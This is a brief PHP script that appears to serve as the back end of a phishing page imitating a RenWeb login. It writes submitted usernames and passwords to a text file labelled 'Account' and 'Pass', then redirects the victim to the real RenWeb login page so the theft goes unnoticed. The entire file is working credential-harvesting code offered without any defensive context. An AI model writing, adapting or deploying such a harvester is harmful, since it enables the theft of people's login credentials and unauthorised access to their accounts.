<?php

file_put_contents("usernames.txt", "Account: " . $_POST['session_key'] . " Pass: " . $_POST['session_password'] . "\n", FILE_APPEND);
header('Location: https://accounts.renweb.com/Account/Login?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Drw1Code%26redirect_uri%3Dhttps%253A%252F%252Frenweb1.renweb.com%252Frenweb1%252Fcallback.html%26response_type%3Dcode%26scope%3Dopenid%2520profile%2520fbtoken%2520rw1Api%2520rw1UserConfig%2520rw1UserInfo%2520ftApi%2520IdentityServerApi%26state%3De99c94b3788842509c7d4b90fa028887%26code_challenge%3DfecOPHjGY7aW5SyIsLx_KNDR2C8ya174Tfb4Wg4BSdM%26code_challenge_method%3DS256%26response_mode%3Dquery');
exit();
